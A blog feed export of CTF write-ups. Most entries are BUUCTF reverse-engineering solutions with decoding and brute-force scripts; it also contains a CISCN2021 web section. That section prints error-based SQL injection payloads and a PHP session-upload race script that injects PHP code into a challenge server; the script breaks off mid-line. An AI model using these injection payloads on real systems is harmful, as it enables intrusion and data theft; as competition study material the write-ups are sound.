src="/2021/10/08/buu-re-2/25.png"></p><p>由于输入的flag是错误的，直接修改eip位正确的地址，再按F9</p><p><img src="/2021/10/08/buu-re-2/26.png"><br><img src="/2021/10/08/buu-re-2/27.png"></p><p>重复以上步骤</p><h2 id="利用python-angr符号执行"><a href="#利用python-angr符号执行" class="headerlink" title="利用python angr符号执行"></a>利用python angr符号执行</h2><h1 id="ACTF新生赛2020-SoulLike"><a href="#ACTF新生赛2020-SoulLike" class="headerlink" title="[ACTF新生赛2020]SoulLike"></a>[ACTF新生赛2020]SoulLike</h1><p>有一个函数太大了，不能反编译，把ida目录下ctg中的hexrays.cfg文件中的MAX_FUNCSIZE=64 改为 MAX_FUNCSIZE=1024</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;actf&#123;&#x27;</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> j == <span class="number">12</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        io = process(<span class="string">b&#x27;./SoulLike&#x27;</span>)</span><br><span class="line">        payload = flag + <span class="built_in">chr</span>(i)</span><br><span class="line">        payload = payload.ljust(<span class="number">18</span>,<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">        print(payload, i*j)</span><br><span class="line">        <span class="comment"># io.recvuntil(b&#x27;input flag:&#x27;)</span></span><br><span class="line">        io.sendline(payload)</span><br><span class="line">        </span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;#&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> j &lt; <span class="number">9</span> :</span><br><span class="line">            index = <span class="built_in">int</span>(io.recv(<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            index = <span class="built_in">int</span>(io.recv(<span class="number">2</span>))</span><br><span class="line">        io.close()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> index == j + <span class="number">1</span>:      <span class="comment">#若接收到的索引为当前所以的+1，说明当前位正确</span></span><br><span class="line">            flag += <span class="built_in">chr</span>(i)</span><br><span class="line">            j += <span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="/2021/10/08/buu-re-2/28.png"></p><blockquote><p>flag{b0Nf|Re_LiT!}</p></blockquote><h1 id="网鼎杯-2020-青龙组-jocker"><a href="#网鼎杯-2020-青龙组-jocker" class="headerlink" title="[网鼎杯 2020 青龙组]jocker"></a>[网鼎杯 2020 青龙组]jocker</h1><p>真正的加密算法被加密了，程序会对其进行解密，用x64dbg dump出解密后的程序</p><p><img src="/2021/10/08/buu-re-2/29.png"><br><img src="/2021/10/08/buu-re-2/30.png"><br><img src="/2021/10/08/buu-re-2/31.png"><br><img src="/2021/10/08/buu-re-2/32.png"></p><p>flag最后五位没有给出，但可以确定flag最后一位为’}’, ‘}’ ^ ‘:’得到一个值，在与其他字符异或，得到了flag的最后5位，考的脑洞</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">unk_4030C0 = [  <span class="number">0x66</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x63</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x64</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x7F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x61</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x67</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x64</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x56</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x6B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x61</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x7B</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x26</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x50</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x63</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x5F</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x5A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x71</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x37</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>]</span><br><span class="line">cmp = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> unk_4030C0:</span><br><span class="line">    <span class="keyword">if</span> i != <span class="number">0</span>:</span><br><span class="line">        cmp.append(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cmp)):</span><br><span class="line">    <span class="keyword">if</span> (i &amp; <span class="number">1</span>) != <span class="number">0</span>:</span><br><span class="line">        cmp[i] += i</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmp[i] ^= i</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, cmp)))</span><br><span class="line"></span><br><span class="line">cmp2 = []</span><br><span class="line">xor = <span class="string">&quot;hahahaha_do_you_find_me?&quot;</span></span><br><span class="line">unk_403040 = [  <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x58</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x56</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x3E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x3C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x1F</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x57</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x6B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x57</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x59</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> unk_403040:</span><br><span class="line">    <span class="keyword">if</span> i != <span class="number">0</span>:</span><br><span class="line">        cmp2.append(i)</span><br><span class="line">print(cmp2)</span><br><span class="line">print(<span class="built_in">len</span>(xor), <span class="built_in">len</span>(cmp2))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">19</span>):</span><br><span class="line">    cmp2[i] ^= <span class="built_in">ord</span>(xor[i])</span><br><span class="line">print(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, cmp2)))</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, cmp2))</span><br><span class="line">a = <span class="built_in">ord</span>(<span class="string">&#x27;&#125;&#x27;</span>) ^ <span class="built_in">ord</span>(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">v3 = <span class="string">&quot;%tp&amp;:&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> v3:</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) ^ a)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><blockquote><p>flag{d07abccf8a410cb37a}</p></blockquote><h1 id="re3"><a href="#re3" class="headerlink" title="re3"></a>re3</h1><p>下个断点，跑起来，程序自动解密</p><p><img src="/2021/10/08/buu-re-2/34.png"></p><p>进入0x402219地址处，按c转化为代码，p识别函数<br>AES加密</p><p><img src="/2021/10/08/buu-re-2/35.png"></p><p>密文密钥都有了，动调时直接看到密钥，静态应该需要分析一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line">key = <span class="string">&#x27;CB8D493521B47A4CC1AE7E62229266CE&#x27;</span></span><br><span class="line">print(<span class="built_in">len</span>(key))</span><br><span class="line">flag = <span class="string">&#x27;BC0AADC0147C5ECCE0B140BC9C51D52B46B2B9434DE5324BAD7FB4B39CDB4B5B&#x27;</span></span><br><span class="line">print(<span class="built_in">len</span>(flag))</span><br><span class="line">aes=AES.new(unhexlify(key),AES.MODE_ECB)</span><br><span class="line">print(aes.decrypt(unhexlify(flag)))</span><br></pre></td></tr></table></figure><blockquote><p>flag{924a9ab2163d390410d0a1f670}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buu-re-1</title>
      <link href="/2021/10/08/buu-re-1/"/>
      <url>/2021/10/08/buu-re-1/</url>
      
        <content type="html"><![CDATA[<h1 id="CrackRTF"><a href="#CrackRTF" class="headerlink" title="CrackRTF"></a>CrackRTF</h1><p>32位程序，无壳，直接ida32反编译。</p><h2 id="第一次输入"><a href="#第一次输入" class="headerlink" title="第一次输入"></a>第一次输入</h2><p><img src="/2021/10/08/buu-re-1/1.png"><br><img src="/2021/10/08/buu-re-1/2.png"></p><p><a href="https://docs.microsoft.com/en-us/windows/win32/seccrypto/alg-id">hash标识符官网查询</a><br>根据对destination的限制可对其进行爆破。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">flag=<span class="string">&quot;@DBApp&quot;</span></span><br><span class="line">str1=<span class="string">&quot;6e32d0943418c2c33385bc35a1470250dd8923a9&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000</span>,<span class="number">999999</span>):</span><br><span class="line">    str2 = hashlib.sha1((<span class="built_in">str</span>(i)+flag).encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    str3 = str2.hexdigest()</span><br><span class="line">    <span class="keyword">if</span> str1 == str3:</span><br><span class="line">            <span class="built_in">print</span> (<span class="built_in">str</span>(i)+flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可得出结果为123321<br>然后查看下面的内容</p><h2 id="第二次输入"><a href="#第二次输入" class="headerlink" title="第二次输入"></a>第二次输入</h2><p><img src="/2021/10/08/buu-re-1/3.png"><br><img src="/2021/10/08/buu-re-1/4.png"></p><p>此处的md5加密进行爆破很困难，但下面还有一个验证函数，进去查看。<br>网上查看了多篇博客，知道了基本原理。</p><p><img src="/2021/10/08/buu-re-1/5.png"><br><a href="https://www.cnblogs.com/palmer0801/p/12111821.html">图片来源</a></p><p>里面还有一个小函数</p><p><img src="/2021/10/08/buu-re-1/6.PNG"></p><p>从AAA中提取的信息与输入进行异或<br>使用Resource_Hacker打开程序</p><p><img src="/2021/10/08/buu-re-1/7.PNG"></p><p>异或的结果保存到dbapp.rtf中，所以要读取他里面的内容，并与前六位异或，就可以得到原先的值<br>.rtf开头都是{\rtf1\ansi  取其前六位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">0x05</span>,<span class="number">0x7D</span>,<span class="number">0x41</span>,<span class="number">0x15</span>,<span class="number">0x26</span>,<span class="number">0x01</span>]</span><br><span class="line">s = <span class="string">&quot;&#123;\\rtf1&quot;</span></span><br><span class="line">b = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    x = <span class="built_in">ord</span>(s[i]) ^ a[i]</span><br><span class="line">    b+=<span class="built_in">chr</span>(x)</span><br><span class="line">print(b)</span><br><span class="line"><span class="comment">#得到~!3a@0，输入到程序后会得到一个名为dbapp.rtf的文件，打开获得flag。</span></span><br></pre></td></tr></table></figure><blockquote><p>Flag{N0_M0re_Free_Bugs}</p></blockquote><h1 id="Youngter-drive"><a href="#Youngter-drive" class="headerlink" title="Youngter-drive"></a>Youngter-drive</h1><p>32位程序，有upx壳，脱去，再放入ida<br>查看main函数</p><p><img src="/2021/10/08/buu-re-1/8.PNG"></p><p>里面创建了两个线程，先执行线程1，再执行线程2，循环往复。</p><h2 id="线程1"><a href="#线程1" class="headerlink" title="线程1"></a>线程1</h2><p><img src="/2021/10/08/buu-re-1/9.PNG"><br><img src="/2021/10/08/buu-re-1/10.PNG"></p><h2 id="线程2"><a href="#线程2" class="headerlink" title="线程2"></a>线程2</h2><p><img src="/2021/10/08/buu-re-1/11.PNG"></p><p>里面没有什么东西</p><h2 id="验证函数"><a href="#验证函数" class="headerlink" title="验证函数"></a>验证函数</h2><p><img src="/2021/10/08/buu-re-1/12.PNG"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> dword_418008[] =  <span class="string">&quot;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasd&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> off_418004[] = <span class="string">&quot;TOiZiZtOrYaToUwPnToBsOaOapsyS&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">29</span>];</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">28</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            flag[i]=off_418004[i];</span><br><span class="line">           <span class="comment">// printf(&quot;%d:%c\n&quot;,i,flag[i]);</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">52</span>;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(off_418004[i]==dword_418008[j])</span><br><span class="line">            &#123;</span><br><span class="line">                flag[i] = j+ <span class="number">38</span>;</span><br><span class="line">                <span class="keyword">if</span>(!(flag[i]&gt;=<span class="string">&#x27;A&#x27;</span>&amp;&amp;flag[i]&lt;=<span class="string">&#x27;Z&#x27;</span>))</span><br><span class="line">                    flag[i] = j + <span class="number">96</span>;</span><br><span class="line">                <span class="comment">//break;</span></span><br><span class="line">               <span class="comment">// printf(&quot;%d:%c\n&quot;,i,flag[i]);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,flag);</span><br><span class="line">    <span class="comment">//for(i=0;i&lt;29;i++)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们只得到了29，但最后一个可以试出来，为E</p><blockquote><p>flag{ThisisthreadofwindowshahaIsESE}</p></blockquote><h1 id="相册"><a href="#相册" class="headerlink" title="相册"></a>相册</h1><p>apk逆向，不是很懂，看别人的wp，通过搜索字符串转到关键信息处，ida打开so文件，base58解密获得邮箱.</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CentOs报错记录</title>
      <link href="/2021/09/24/CentOs%E6%8A%A5%E9%94%99%E8%AE%B0%E5%BD%95/"/>
      <url>/2021/09/24/CentOs%E6%8A%A5%E9%94%99%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="071fb79cd68f01b7a0263b846c007b44c2462036723a19af4d09b3788673103c">846031f3c0e2d4bcbb4508084706789f834894ad249960b41c5c6cf21d9a26da267ebcceb1edbd70c69be959f2c6a093aa2895f06c76f861f341fada79c65e1853cb4ec27aab58be87e58f8e36b318260f1fb45232f420e1322457b7452331e35c6e3283f6ffdf0f5d4c89e552230e16f76675aca85fc70e2bd92f553fbdfefa4d4b4863a25095111334b45d535c6826d158dd1cbbdf839491df2f89c4f0e471d4435c8c8e61f050e5641131b8f6df10139fe4e49e0ff592d028a2a324f75f795374759fa0dbb37cb84ef5247cc9e98e777d1c30295d4a9c9d016040b1698d9c2bf31e5a1e79ce30e8088c250253ba537f6f6c11dd45a03c22178fa52e17d8af1bc8be2b7147bb01e0c9cbcb8c26617f0e87a20a104f69ef50f38f356a70be03f46b3bfb9112d936f0f98006d90cf4ec9c14d0e8d71e496a04d9ceb016cd4b865a663f576a2be885477eaf00225cf39194ba1dbb70045430c95b7269a3b7dd2b815c4f5a929e4aa514306fa8c3fb6ade5439608abe09a1b49580d1135a9c69a205fde443b3ba8890a50ba1a7ea0c420a205d6771b7e02fd38f86a71027767f3becf52188272869f9daddbbc279dcd29fe2af0f3b0ebcdcae1d375ac9a5ba000df0ded8d630769f004b60a73c61b22a4e066a5338330be0c17f608445e746c0d9cc6a947e38de63d09685b6ae2a8c5724b5d29dc9bffee923eb5a2af75c8e4479f7c6d00aa7a8dbbbfe6c4db079bff1cef6d44c6d1a71e09a8c8dd56c55ebcf143e3fa2d1ab90e68e59ebe71cf49c992a657e0ddb5651c0f6815966f04ef0e3dad41d81f51619a3c40b8ebd9a7e63496bd3581201f8cfcdcbb2736707a7cb9459f385b257741ab45bf9439cbd3f2199b5e0a9877f848e0d49589f05741b1e5232acf192abfbdb9436abeb5bbbf5172e0a490241e568ddf815d4f2c3f30cb4b5e87b40363bc6b1d4581dac40b8fa1db37186a5c8374dc85b2a9a2541924d7ef2d6</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2021</title>
      <link href="/2021/05/16/CISCN2021/"/>
      <url>/2021/05/16/CISCN2021/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><a id="more"></a><h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy-sql"></a>easy-sql</h2><p>盲注，有报错：(‘’) and password=(‘’) LIMIT 0,1’ at line 1</p><p>写脚本</p><p>发现过滤了information</p><p>库：security</p><p>猜出表名 flag</p><p>选择报错注入 join，as爆列名</p><p>id no</p><p>d8088756-a82f-486a-a31c-8032d1590bff</p><p>试了好几遍，原来是列……</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;&#39;)and(select extractvalue(0x0a,concat(0x0a,(select (select substr(group_concat(&#96;d8088756-a82f-486a-a31c-8032d1590bff&#96;),1,20) from flag)))))#&amp;passwd&#x3D;&amp;Submit&#x3D;%E7%99%BB%E5%BD%95</span><br><span class="line"></span><br><span class="line">uname&#x3D;&#39;)and(select extractvalue(0x0a,concat(0x0a,(select (select substr(group_concat(&#96;d8088756-a82f-486a-a31c-8032d1590bff&#96;),20,30) from flag)))))#&amp;passwd&#x3D;&amp;Submit&#x3D;%E7%99%BB%E5%BD%95</span><br></pre></td></tr></table></figure><p>多次出flag</p><blockquote><p>CISCN{Qn1ik-Q9MLB-pNYUn-Ye8VA-tdAX3-}</p></blockquote><h2 id="easy-source"><a href="#easy-source" class="headerlink" title="easy_source"></a>easy_source</h2><p>发现备份文件：.index.php.swo</p><p>flag应该是藏在了注释里，应该是用php自带类库</p><p>PHP通过反射类ReflectionMethod和getDocComment 获取注释返回</p><p><a href="http://www.haimengli.com/php-tong-guo-fan-she-lei/?fileGuid=cKDQRHCPv6VjxWKx">http://www.haimengli.com/php-tong-guo-fan-she-lei/</a></p><p><img src="/2021/05/16/CISCN2021/1.png"></p><p>爆破各个函数</p><p><img src="/2021/05/16/CISCN2021/2.png"></p><blockquote><p>CISCN{rGDvG-RKMy5-dJWt3-KCIh8-3xzZp-}</p></blockquote><h2 id="middle-source"><a href="#middle-source" class="headerlink" title="middle_source"></a>middle_source</h2><p><img src="/2021/05/16/CISCN2021/3.png"></p><p>扫出/.listing文件</p><p><img src="/2021/05/16/CISCN2021/4.png"></p><p><img src="/2021/05/16/CISCN2021/5.png"></p><p>提供了phpinfo页面，结合文件包含：LFI with PHPInfo</p><p>awsl,phpinfo+lfi的脚本好难搞，我又菜……</p><p>搜索一波，可以借助phpinfo提供的sessionpath完成session文件上传竞争</p><p>这个脚本比较好找……好改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">sessid = <span class="string">&#x27;test&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">t1</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = <span class="string">&quot;&quot;</span></span><br><span class="line">        response = requests.post(</span><br><span class="line">        url=<span class="string">&#x27;http://121.36.14.168:24395/&#x27;</span>,</span><br><span class="line">        cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;,</span><br><span class="line">        data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;5&#x27;</span> * <span class="number">40</span> + <span class="string">&#x27;&lt;?php var_dump(scandir(&quot;/etc/haffdebchd/cfdidaddda/afjacficij/ggahijaeee/bjcbcedaji/fl444444g&quot;));?&gt;&#x27;</span>&#125;,</span><br><span class="line">        files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;a.txt&#x27;</span>, f)&#125;,</span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">t2</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data =&#123;</span><br><span class="line">            <span class="string">&#x27;cf&#x27;</span>: <span 